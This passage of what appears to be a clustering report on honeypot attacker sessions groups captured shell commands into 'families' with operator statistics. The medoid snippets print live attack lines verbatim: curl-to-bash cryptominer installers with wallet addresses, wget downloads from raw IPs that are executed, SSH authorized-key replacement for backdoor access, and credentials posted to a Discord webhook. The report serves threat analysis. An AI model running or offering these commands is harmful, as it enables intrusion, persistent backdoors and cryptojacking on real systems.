uname -a; curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh | bash -s 46ZyBG6qqr7g71DtkGjyhTc9BKYxVjbnB9zooEknEW14GB5p9xqi5p537ZWpRd25p6UQSvqGQey2WN7zTxFy4xnU63e3NML
```

Consensus (op, conn) pairs:

```python
[('uname', ';'), ('curl', '|'), ('bash', 'EOS')]
```

Top operators: [('uname', 1), ('curl', 1), ('bash', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| c99397799ddb8226 | 057585d5974c |        1 |

## Family 128

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=cd29ef00759fa289` (session `11bcd98837be`, n_rows=1)  

**Medoid commands (snippet):**

```bash
sh; shell; ping; sh; enable; system; echo LOL
```

Consensus (op, conn) pairs:

```python
[('sh', ';'), ('shell', ';'), ('ping', ';'), ('sh', ';'), ('enable', ';'), ('system', ';'), ('echo', 'EOS')]
```

Top operators: [('sh', 2), ('shell', 1), ('ping', 1), ('enable', 1), ('system', 1), ('echo', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| cd29ef00759fa289 | 11bcd98837be |        1 |

## Family 61

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=cdd746a58d8a675e` (session `2e6368319c65`, n_rows=1)  

**Medoid commands (snippet):**

```bash
rm -f /dev/.d; rm -f /dev/.f; >/dev/.d; (chmod 777 /dev/.d || cp /bin/echo /dev/.d; >/dev/.d); cp /dev/.d /dev/.f
```

Consensus (op, conn) pairs:

```python
[('rm', ';'), ('rm', ';'), ('>', ';'), ('chmod', '||'), ('cp', ';'), ('>', ';'), ('cp', 'EOS')]
```

Top operators: [('rm', 2), ('>', 2), ('cp', 2), ('chmod', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| cdd746a58d8a675e | 2e6368319c65 |        1 |

## Family 165

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=d022966f40af2828` (session `025371bede7b`, n_rows=2)  

**Medoid commands (snippet):**

```bash
ls /home
exit
```

Consensus (op, conn) pairs:

```python
[('ls', ';'), ('exit', 'EOS')]
```

Top operators: [('ls', 1), ('exit', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| d022966f40af2828 | 025371bede7b |        2 |

## Family 144

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=d306263fe818f39a` (session `0aab0b3a4dd1`, n_rows=1)  

**Medoid commands (snippet):**

```bash
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\\"content\\": \\"54.84.38.55:22:admin:admin\\"}" https://discord.com/api/webhooks/1127186398882046065/-k1bVOee9trQSJ1HR3wtGMgG06Nb7SHBfStPETaYv7RXzkjgF0S9WBWB6A7ROf2LogB ...
```

Consensus (op, conn) pairs:

```python
[('curl', 'EOS')]
```

Top operators: [('curl', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| d306263fe818f39a | 0aab0b3a4dd1 |        1 |

## Family 106

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=d92eaeb3450bf809` (session `01ffd1843c24`, n_rows=9)  

**Medoid commands (snippet):**

```bash
uname -a
hostname
uname -m && pkill upnpsetup
sudo pkill upnpsetup
rm ./upnpsetup
wget -nc http://103.40.123.34/k.php?a=x86_64,WTTH559VNDCFQJ1HH -O ./upnpsetup
chmod 777 ./upnpsetup
sudo ./upnpsetup
./upnpsetup
```

Consensus (op, conn) pairs:

```python
[('uname', ';'), ('hostname', ';'), ('uname', '&&'), ('kill', ';'), ('sudo', ';'), ('rm', ';'), ('wget', ';'), ('chmod', ';'), ('sudo', ';'), ('PH_EXEC_2', 'EOS')]
```

Top operators: [('uname', 2), ('sudo', 2), ('hostname', 1), ('kill', 1), ('rm', 1), ('wget', 1), ('chmod', 1), ('PH_EXEC_2', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| d92eaeb3450bf809 | 01ffd1843c24 |        9 |

## Family 158

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=db8acb9781fa6169` (session `3832469820de`, n_rows=2)  

**Medoid commands (snippet):**

```bash
cd ~; chattr -ia .ssh; lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgT ...
```

Consensus (op, conn) pairs:

```python
[('cd', ';'), ('chattr', ';'), ('lockr', ';'), ('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', 'EOS')]
```

Top operators: [('cd', 3), ('chattr', 1), ('lockr', 1), ('rm', 1), ('mkdir', 1), ('echo', 1), ('chmod', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| db8acb9781fa6169 | 3832469820de |        2 |

## Family 78

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=dd60aa1d5e247ff5` (session `067e110ea8b9`, n_rows=2)  

**Medoid commands (snippet):**

```bash
echo -e '\\x79\\x65\\x73\\x68\\x65\\x6c\\x6f'
cat $SHELL || while read i; do echo $i; done < $SHELL || dd if=$SHELL bs=22 count=1
```

Consensus (op, conn) pairs:

```python
[('echo', ';'), ('cat', '||'), ('read', ';'), ('echo', ';'), ('dd', 'EOS')]
```

Top operators: [('echo', 2), ('cat', 1), ('read', 1), ('dd', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| dd60aa1d5e247ff5 | 067e110ea8b9 |        2 |

## Family 70

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=df7439ac0f98cf39` (session `011a2f3a01d3`, n_rows=1)  

**Medoid commands (snippet):**

```bash
command -v curl
```

Consensus (op, conn) pairs:

```python
[('command', 'EOS')]
```

Top operators: [('command', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| df7439ac0f98cf39 | 011a2f3a01d3 |        1 |

## Family 125

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=e2724213a3b85367` (session `cf03edfdfe14`, n_rows=9)  

**Medoid commands (snippet):**

```bash
ls -rlt
ls -lrt
ls -lrta
touch file
ls -lrt
curl https://www.viessmann.co.uk
nc
nc -vv 208
nc -vv 107.23.254.247.214 80
```

Consensus (op, conn) pairs:

```python
[('ls', ';'), ('ls', ';'), ('ls', ';'), ('touch', ';'), ('ls', ';'), ('curl', ';'), ('nc', ';'), ('nc', ';'), ('nc', 'EOS')]
```

Top operators: [('ls', 4), ('nc', 3), ('touch', 1), ('curl', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| e2724213a3b85367 | cf03edfdfe14 |        9 |

## Family 51

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=e276f35b86f5349e` (session `7470e7762f37`, n_rows=2)  

**Medoid commands (snippet):**

```bash
kill %%1
echo A
```

Consensus (op, conn) pairs:

```python
[('kill', ';'), ('echo', 'EOS')]
```

Top operators: [('kill', 1), ('echo', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| e276f35b86f5349e | 7470e7762f37 |        2 |

## Family 119

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=e6a8a5c584bbb2e0` (session `002dacf05462`, n_rows=1)  

**Medoid commands (snippet):**

```bash
wget http://95.214.27.202/x86_64 -O-> .i || busybox wget http://95.214.27.202/x86_64 -O-> .i || wd1 http://95.214.27.202/x86_64 -O-> .i; ./.i ssh.wget.x86_64; >.i
```

Consensus (op, conn) pairs:

```python
[('wget', '||'), ('busybox', '||'), ('wd1', ';'), ('PH_EXEC_1', ';'), ('>', 'EOS')]
```

Top operators: [('wget', 1), ('busybox', 1), ('wd1', 1), ('PH_EXEC_1', 1), ('>', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| e6a8a5c584bbb2e0 | 002dacf05462 |        1 |

## Family 139

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=e6d885f3630c0c6c` (session `830634aac9ae`, n_rows=1)  

**Medoid commands (snippet):**

```bash
rm -fr x86_64 && wget http://65.109.58.15:8000/x86_64 && chmod +x x86_64 && ./x86_64 bruted.ssh
```

Consensus (op, conn) pairs:

```python
[('rm', '&&'), ('wget', '&&'), ('chmod', '&&'), ('PH_EXEC_1', 'EOS')]
```

Top operators: [('rm', 1), ('wget', 1), ('chmod', 1), ('PH_EXEC_1', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| e6d885f3630c0c6c | 830634aac9ae |        1 |

## Family 53

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=e7ec178c2295af3c` (session `1dce250b0866`, n_rows=1)  

**Medoid commands (snippet):**

```bash
curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 49fJJBi8TxsGB8KB4WCg2ZWNtQNCvAMB4HYkwS31HfVWJwvx5xQw3rpYx7M635ew5TZy4YK5HkLVoJCdE2X57LQiGfy6SgF; sudo hive-passwd cummypass; sudo pkill Xorg; sudo p ...
```

Consensus (op, conn) pairs:

```python
[('curl', '|'), ('bash', ';'), ('sudo', ';'), ('sudo', ';'), ('sudo', 'EOS')]
```

Top operators: [('sudo', 3), ('curl', 1), ('bash', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| e7ec178c2295af3c | 1dce250b0866 |        1 |

## Family 71

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=e90a9ab1b9baedc3` (session `7a5c2eb615fc`, n_rows=1)  

**Medoid commands (snippet):**

```bash
cat /proc/cpuinfo | grep name | wc -l
```

Consensus (op, conn) pairs:

```python
[('cat', '|'), ('grep', '|'), ('wc', 'EOS')]
```

Top operators: [('cat', 1), ('grep', 1), ('wc', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| e90a9ab1b9baedc3 | 7a5c2eb615fc |        1 |

## Family 55

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=ea917b47ab18d31a` (session `53c9d44086cc`, n_rows=8)  

**Medoid commands (snippet):**

```bash
free -m
passwd
passwd
help
clear
git clone https://github.com/vanhauser-thc/thc-hydra
git https://github.com/vanhauser-thc/thc-hydra
passwd
```

Consensus (op, conn) pairs:

```python
[('free', ';'), ('passwd', ';'), ('passwd', ';'), ('help', ';'), ('clear', ';'), ('git', ';'), ('git', ';'), ('passwd', 'EOS')]
```

Top operators: [('passwd', 3), ('git', 2), ('free', 1), ('help', 1), ('clear', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| ea917b47ab18d31a | 53c9d44086cc |        8 |

## Family 172

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=eb1a000296b65570` (session `17d323a7ed0c`, n_rows=14)  

**Medoid commands (snippet):**

```bash
cd ~; chattr -ia .ssh; lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgT ...
```

Consensus (op, conn) pairs:

```python
[('cd', ';'), ('chattr', ';'), ('lockr', ';'), ('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', ';'), ('echo', '|'), ('passwd', '|'), ('bash', ';'), ('echo', '|'), ('passwd', ';'), ('cat', '|'), ('grep', '|'), ('head', '|'), ('awk', ';'), ('free', '|'), ('grep', '|'), ('awk', ';'), ('ls', ';'), ('which', ';'), ('crontab', ';'), ('w', ';'), ('uname', ';'), ('cat', '|'), ('grep', '|'), ('grep', '|'), ('wc', ';'), ('top', ';'), ('uname', 'EOS')]
```

Top operators: [('grep', 4), ('cd', 3), ('echo', 3), ('passwd', 2), ('cat', 2), ('awk', 2), ('uname', 2), ('chattr', 1), ('lockr', 1), ('rm', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| eb1a000296b65570 | 17d323a7ed0c |       14 |

## Family 130

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=ebcc3401f2ddcd62` (session `1d8faf2e8c18`, n_rows=2)  

**Medoid commands (snippet):**

```bash
ifconfig
echo Hi | cat -n
```

Consensus (op, conn) pairs:

```python
[('ifconfig', ';'), ('echo', '|'), ('cat', 'EOS')]
```

Top operators: [('ifconfig', 1), ('echo', 1), ('cat', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| ebcc3401f2ddcd62 | 1d8faf2e8c18 |        2 |

## Family 45

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=ee9e470552dfabe8` (session `53b24efe9b22`, n_rows=1)  

**Medoid commands (snippet):**

```bash
curl -O http://206.81.25.53/universal.sh; wget http://206.81.25.53/universal.sh; chmod 777 universal.sh; ./universal.sh; sh universal.sh; rm -rf universal*
```

Consensus (op, conn) pairs:

```python
[('curl', ';'), ('wget', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('sh', ';'), ('rm', 'EOS')]
```

Top operators: [('curl', 1), ('wget', 1), ('chmod', 1), ('PH_EXEC_1', 1), ('sh', 1), ('rm', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| ee9e470552dfabe8 | 53b24efe9b22 |        1 |

## Family 170

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=f23ebe5ab47c9505` (session `5551742e99f1`, n_rows=4)  

**Medoid commands (snippet):**

```bash
cd ~; chattr -ia .ssh; lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgT ...
```

Consensus (op, conn) pairs:

```python
[('cd', ';'), ('chattr', ';'), ('lockr', ';'), ('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', ';'), ('cat', '|'), ('grep', '|'), ('wc', ';'), ('echo', '|'), ('passwd', '|'), ('bash', 'EOS')]
```

Top operators: [('cd', 3), ('echo', 2), ('chattr', 1), ('lockr', 1), ('rm', 1), ('mkdir', 1), ('chmod', 1), ('cat', 1), ('grep', 1), ('wc', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| f23ebe5ab47c9505 | 5551742e99f1 |        4 |

## Family 127

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=f7a1b0e329e76016` (session `34c19d0cf380`, n_rows=1)  

**Medoid commands (snippet):**

```bash
curl -O http://134.122.59.164/systemd && curl -O http://134.122.59.164/banner.log && curl -O http://134.122.59.164/bios.txt && curl -O http://134.122.59.164/bone && curl -O http://134.122.59.164/brute && curl -O http://134.122.59.164/hrdmv1 && curl -O http://1 ...
```

Consensus (op, conn) pairs:

```python
[('curl', '&&'), ('curl', '&&'), ('curl', '&&'), ('curl', '&&'), ('curl', '&&'), ('curl', '&&'), ('curl', '&&'), ('curl', '&&'), ('curl', '&&'), ('curl', '||'), ('wget', '&&'), ('wget', '&&'), ('wget', '&&'), ('wget', '&&'), ('wget', '&&'), ('wget', '&&'), ('wget', '&&'), ('wget', '&&'), ('wget', '&&'), ('wget', '&&'), ('chmod', '&&'), ('bash', '||'), ('PH_EXEC_2', '&&'), ('apt', '||'), ('yum', '||'), ('dnf', '&&'), ('apt', '||'), ('yum', '||'), ('dnf', '&&'), ('screen', 'EOS')]
```

Top operators: [('curl', 10), ('wget', 10), ('apt', 2), ('yum', 2), ('dnf', 2), ('chmod', 1), ('bash', 1), ('PH_EXEC_2', 1), ('screen', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| f7a1b0e329e76016 | 34c19d0cf380 |        1 |

## Family 69

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=f8909284d6974401` (session `1ca52ab8b7b8`, n_rows=1)  

**Medoid commands (snippet):**

```bash
nvidia-smi & lscpu
```

Consensus (op, conn) pairs:

```python
[('nvidia-smi', 'EOS')]
```

Top operators: [('nvidia-smi', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| f8909284d6974401 | 1ca52ab8b7b8 |        1 |

## Family 67

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=f8b0ee65ce08cdd7` (session `65a63c9ba2b9`, n_rows=1)  

**Medoid commands (snippet):**

```bash
cat /proc/cpuinfo | grep 'model name'
```

Consensus (op, conn) pairs:

```python
[('cat', '|'), ('grep', 'EOS')]
```

Top operators: [('cat', 1), ('grep', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| f8b0ee65ce08cdd7 | 65a63c9ba2b9 |        1 |

## Family 89

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=f984942576776cb2` (session `7c788224d96a`, n_rows=2)  

**Medoid commands (snippet):**

```bash
ifconfig
uname -a
```

Consensus (op, conn) pairs:

```python
[('ifconfig', ';'), ('uname', 'EOS')]
```

Top operators: [('ifconfig', 1), ('uname', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| f984942576776cb2 | 7c788224d96a |        2 |

## Family 134

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=fcaa1e9b8aba1038` (session `04e14c04010a`, n_rows=1)  

**Medoid commands (snippet):**

```bash
wget http://31.44.185.235/s -O- | sh; cat /bin/sh
```

Consensus (op, conn) pairs:

```python
[('wget', '|'), ('sh', ';'), ('cat', 'EOS')]
```

Top operators: [('wget', 1), ('sh', 1), ('cat', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| fcaa1e9b8aba1038 | 04e14c04010a |        1 |
